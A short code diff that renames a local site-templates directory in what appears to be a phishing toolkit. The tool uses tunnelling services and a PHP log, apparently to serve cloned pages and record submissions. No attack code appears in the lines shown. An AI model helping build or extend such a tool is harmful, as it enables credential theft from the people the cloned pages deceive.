@@ -195,7 +195,7 @@ repo_branch = "spyfiles-main"
 # CF = Cloudflared, NR = Ngrok, LX = LocalXpose, LHR = LocalHostRun
 
 home = getenv("HOME")
-sites_dir = f"{home}/.maxsites"
+sites_dir = f"{home}/.spysites"
 templates_file = f"{sites_dir}/templates.json"
 tunneler_dir = f"{home}/.tunneler"
 php_file = f"{tunneler_dir}/php.log"
